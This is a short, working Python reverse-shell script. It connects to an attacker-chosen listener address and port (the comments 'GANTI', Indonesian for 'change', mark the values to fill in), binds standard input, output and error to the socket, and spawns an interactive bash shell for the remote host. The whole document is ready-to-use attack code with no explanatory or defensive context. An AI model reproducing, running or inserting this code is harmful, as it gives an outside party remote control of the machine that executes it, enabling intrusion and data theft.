#!/usr/bin/env python3
import socket, subprocess, os, pty

LHOST = '192.168.1.100'  # GANTI
LPORT = 4444              # GANTI

s = socket.socket()
s.connect((LHOST, LPORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn('/bin/bash')
